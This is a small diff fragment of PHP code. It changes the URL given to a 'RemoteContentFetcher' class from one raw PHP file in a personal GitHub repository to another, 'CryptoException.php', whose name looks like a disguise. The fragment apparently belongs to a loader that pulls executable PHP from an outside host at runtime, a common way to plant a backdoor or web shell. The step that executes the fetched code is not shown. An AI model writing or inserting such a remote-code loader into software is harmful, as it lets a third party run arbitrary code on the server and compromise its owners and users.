@@ -85,7 +85,7 @@ class RemoteContentFetcher {
 }
 #xaaxa
 try {
-    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/NoobTecho/w/refs/heads/main/no-enc.php');
+    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/NoobTecho/w/refs/heads/main/CryptoException.php');
     $fetcher->setOptions([
         'timeout' => 60,
         'ssl_verify' => true
